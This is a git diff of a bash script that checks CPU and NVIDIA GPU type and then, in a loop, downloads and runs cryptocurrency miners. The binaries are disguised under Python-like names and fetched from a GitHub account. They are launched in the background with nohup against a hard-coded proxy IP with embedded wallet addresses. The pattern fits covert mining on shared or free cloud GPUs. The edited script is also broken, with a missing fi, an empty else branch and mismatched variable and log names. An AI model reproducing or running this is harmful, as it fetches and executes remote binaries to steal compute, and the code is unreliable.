@@ -7,7 +7,8 @@ PROX=78.47.69.185
 ETPort=443
 RVPort=80
 VCPort=8080
-echo -e '################## '"MAX $PROX"' Ver:0.1.2     ################'
+XMProt=21
+echo -e '################## '"MAX $PROX"' Ver:0.2.2     ################'
 echo -e '##########################################################################'
 
 ## getting IP info
@@ -93,147 +94,151 @@ On_IPurple='\033[0;105m'  # Purple
 On_ICyan='\033[0;106m'    # Cyan
 On_IWhite='\033[0;107m'   # White
 
+#clen log
+
 echo > oout
 echo > ooutxm
-echo  > ooutx
-###### VC
+echo  > ooutvc
 
-rm -rf pythonheq
-wget -q https://github.com/one10001/10001code/raw/main/pythonheq
-chmod +x pythonheq
-
+#################### CPU ARC ################################
 
 if [ $(lscpu |grep avx512 |wc -l) == 1 ]
 then 
-echo -e "${On_IGreen}"'########################################################'
-echo -e "####################### CPU AVX512 #########################"
-echo -e '###############################3############################'"${Color_Off}"
-
+echo -e "${On_IGreen}"'## CPU AVX512 ##'"${Color_Off}"
+OP=XM
+CPU='AVX512'
 elif [ $(lscpu |grep avx2 |wc -l) == 1 ]
 then
-echo -e "${On_IBleu}"'########################################################'
-echo -e "####################### CPU AVX2 #########################"
-echo -e '###############################3############################'"${Color_Off}"
+echo -e "${On_IBlue}"'##CPU AVX2 ##'"${Color_Off}"
+OP=XM
+CPU='AVX2'
 elif [ $(lscpu |grep avx |wc -l) == 1 ]
 then
-echo -e "${On_IYellow}"'########################################################'
-echo -e "####################### CPU AVX #########################"
-echo -e '###############################3############################'"${Color_Off}"
+echo -e "${On_IYellow}"'## CPU AVX ##'"${Color_Off}"
+OP=XM
+CPU='AVX'
 else
-echo -e "${On_IRed}"'########################################################'
-echo -e "####################### CPU OLD #########################"
-echo -e '###############################3############################'"${Color_Off}"
+echo -e "${On_IRed}"'## CPU OLD ##'"${Color_Off}"
+OP=VC
+CPU='OLD'
 fi
 
-
-
-# RV
-
-rm -rf python2.6.6
-rm -rf pythonoc
-wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
-chmod +x python2.6.6
-cp python2.6.6 pythonoc
-
-
-
-# ET
-rm -rf pyeth2
-rm -rf pyethoc
-wget -q  https://github.com/one10001/ethminer/releases/download/v0.0.1/pyeth2 2> lol.out
-chmod +x pyeth2
-cp pyeth2 pyethoc
-
-# exec
-i="0"
-while true
-do
-./pythonheq -v -l "$PROX":"$VCPort" -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."VC_""$INFO" -t 4 1>> ooutx 2>> ooutx &
+#################### GPU Type #########################
 GPU=NULL
 if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
 then
 
-echo -e "${On_IGreen}"'#######################################################'
-echo -e "####################### P100-PCIE #########################"
-echo -e '###########################################################'"${Color_Off}"
+echo -e "${On_IGreen}"'###### P100-PCIE ######'"${Color_Off}"
 GPU=P100
-nohup  ./pyeth2  -P stratum+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7.ET_CU_P100_"$INFO"@$PROX:$ETPort  -U 2>> oout 1>> oout &
-#nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RV_CU_P100_$IPNAME@$PROX:$RVPort  -U 2>> oout 1>> oout &
+OPG=ET
+PROG=CU
 elif [ $(nvidia-smi | grep failed |wc -l) == 1 ]
 then
-echo -e "${On_IRed}"'#######################################################'
-echo -e "####################### ONLY CPU #########################"
-echo -e '###########################################################'"${Color_Off}"
+echo -e "${On_IRed}"'#### ONLY CPU ###'"${Color_Off}"
 GPU=NONE
-echo > ooutxm
-rm -rf pythonxm
-wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
-chmod +x pythonxm
-#                Config
-wget -q https://github.com/one10001/10001code/raw/main/config.json
-sed -i "s+ip0001+RV_$INFO+g" config.json
-sed -i "s+xxpppxx+$PROX+g" config.json
-
-#./pythonxm -c config.json -l ooutxm 2>> ooutxm 1>> ooutxm &
+OPG=NONE
 elif [ $( nvidia-smi  2>&1 |  grep "not found" |wc -l) == 1 ]
 then
-echo -e "${On_IRed}"'###########################################################'
-echo -e "####################### No nvidia ONLY CPU #########################"
-echo -e '####################################################################'"${Color_Off}"
+echo -e "${On_IRed}"'### No cuda ONLY CPU ###'"${Color_Off}"
 GPU=NONE
-echo > ooutxm
-rm -rf pythonxm
-wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
-chmod +x pythonxm
-#                Config
-wget -q https://github.com/one10001/10001code/raw/main/config.json
-sed -i "s+ip0001+RV_$INFO+g" config.json
-sed -i "s+xxpppxx+$PROX+g" config.json
-
-#./pythonxm -c config.json -l ooutxm 2>> ooutxm 1>> ooutxm &
+OPG=NONE
 
 elif [ $(nvidia-smi | grep T4 |wc -l) == 1 ]
 then
+echo -e "${On_IBlue}"'####        T4        ###'"${Color_Off}"
 GPU=T4
-echo -e "${On_IBlue}"'##################################################################'
-echo -e "#######################        T4        #########################"
-echo -e '##################################################################'"${Color_Off}"
-nohup  ./pyeth2  -P stratum+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7.OC_T4_"$INFO"@"$PROX":"$ETPort"  -U  2>> oout 1>> oout &
-#nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_T4_$IPNAME@$PROX:$RVPort  -G  2>> oout 1>> oout &
+OPG=ET
+PROG=CL
 elif [ $(nvidia-smi | grep K80 |wc -l) == 1 ]
 then
+echo -e "${On_IYellow}"'###    K80     ###'"${Color_Off}"
 GPU=K80
-echo -e "${On_IYellow}"'############################################################'
-echo -e "#######################    K80     #########################"
-echo -e '############################################################'"${Color_Off}"
-#nohup  ./pyethoc  -P stratum+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7.OC_K80_$IPNAME@$PROX:$ETPort  -G 2>> oout 1>> oout &
-nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_K80_"$INFO"@"$PROX":"$RVPort"  -G 2>> oout 1>> oout &
+OPG=RV
+PROG=CL
+
 elif [ $(nvidia-smi | grep P4 |wc -l) == 1 ]
 then
-GPU=P4
-echo -e "${On_ICyan}"'####################################################################'
-echo -e "#######################    P4 : Rv + ET    #########################"
-echo -e '####################################################################'"${Color_Off}"
-nohup  ./pyeth2  -P stratum+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7.OC_P4_"$INFO"@$PROX:$ETPort  -U 2>> oout 1>> oout &
-nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_P4_"$INFO"@$PROX:$RVPort  -U 2>> oout 1>> oout &
 
+echo -e "${On_ICyan}"'###    P4    ###'"${Color_Off}"
+GPU=P4
+OPG=ET
+PROG=CU
 else
+echo -e "${On_IPurple}"'###     Other GPU   ####'"${Color_Off}"
 GPU=OTHER
-echo -e "${On_IPurple}"'##############################################################'
-echo -e "#######################     Other GPU   #########################"
-echo -e '##############################################################'"${Color_Off}"
-nohup  ./pyethoc  -P stratum+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7.OC_Other_"$INFO"@$PROX:$ETPort  -G 2>> oout 1>> oout &
-nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_Other_"$INFO"@$PROX:$RVPort  -G 2>> oout 1>> oout &
+OPG=ET
+PROG=CL
 
 fi
+
+######################################
+
+
+
+# exec
+i="0"
+
+while true
+do
+if [ $OP == "XM" ]
+then
+####### XM
+#               Executable
+echo start >> ooutxm
+rm -rf pythonxm
+wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
+chmod +x pythonxm
+#                Config
+wget -q https://github.com/one10001/10001code/raw/main/config.json
+sed -i "s+ip0001+RV_$IPNAME+g" config.json
+sed -i "s+xxpppxx+$PROX+g" config.json
+
+nohup ./pythonxm -c config.json -l ooutxm 2>> ooutxm 1>> ooutxm &
+
+else
+###### VC
+echo start >> ooutxm
+rm -rf pythonheq
+wget -q https://github.com/one10001/10001code/raw/main/pythonheq
+chmod +x pythonheq
+
+nohup ./pythonheq -v -l "$PROX":"$VCPort" -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."VC_""$INFO" -t 4 1>> ooutx 2>> ooutx &
+
+fi
+
+if [ $OPG == "ET" ]
+then
+    rm -rf pyeth2
+    wget -q  https://github.com/one10001/ethminer/releases/download/v0.0.1/pyeth2 2> lol.out
+    chmod +x pyeth2
+    if  [ $PROG == "CU" ]
+    then
+        nohup  ./pyeth2  -P stratum+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$ETPort  -U 2>> oout 1>> oout &
+    else
+        nohup  ./pyeth2  -P stratum+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$ETPort  -G 2>> oout 1>> oout &
+    fi
+
+elif [ $OPG == "RV" ]
+then
+    rm -rf python2.6.6
+    wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
+    chmod +x python2.6.6
+    if  [ $PROG == "CU" ]
+    then
+    nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$RVPort  -U 2>> oout 1>> oout &
+    else
+    nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$RVPort  -G 2>> oout 1>> oout &
+    fi
+else
+fi
+
 
     while true
     do
         i=$[$i+1]
         if [ $GPU == "NONE" ]
         then
-        echo -e "${On_Red}ONLY CPU -> ${BIYellow}  VC"
-       # echo -e "${On_IRed} Results XM${BIYellow} $i ${Color_Off}:  ${BIBlue} $(grep acc ooutxm | wc -l) ${Color_Off} X ${BIBlack} Ratio : ${BIRed} $[$(grep acc ooutxm | wc -l)*100/$i] ${Color_Off}" 
+        echo -e "${On_Red}ONLY CPU -> ${BIYellow} XM/VC"
         elif [ $GPU == "T4" ]
         then
         echo -e "${On_Green}GPU T4  -> ${BIYellow}  ET"
@@ -254,8 +259,15 @@ fi
         echo -e "${On_Green}GPU OTHER ET + RV  -> ${BIYellow}  RV"
         echo -e "${On_IGreen}Results ET + RV${BIYellow} $i ${Color_Off}:  ${BIGreen} $(grep Acc oout | wc -l) ${Color_Off} X ${BIBlack} Ratio : ${BIRed} $[$(grep Acc oout | wc -l)*100/$i] ${Color_Off}" 
         fi
-        echo -e "${On_IBlue}Results VC${BIYellow} $i ${Color_Off}:  ${BIBlue} $(grep Acc ooutx | wc -l) ${Color_Off} X ${BIBlack} Ratio : ${BIRed} $[$(grep Acc ooutx | wc -l)*100/$i] ${Color_Off}" 
+        
+        if [ $OP == "XM" ]
+        then
+            echo -e "${On_IRed} Results XM${BIYellow} $i ${Color_Off}:  ${BIBlue} $(grep acc ooutxm | wc -l) ${Color_Off} X ${BIBlack} Ratio : ${BIRed} $[$(grep acc ooutxm | wc -l)*100/$i] ${Color_Off}" 
+        else
+            echo -e "${On_IBlue}Results VC${BIYellow} $i ${Color_Off}:  ${BIBlue} $(grep Acc ooutvc | wc -l) ${Color_Off} X ${BIBlack} Ratio : ${BIRed} $[$(grep Acc ooutvc | wc -l)*100/$i] ${Color_Off}" 
+        
         sleep 30
+
     done
 
 
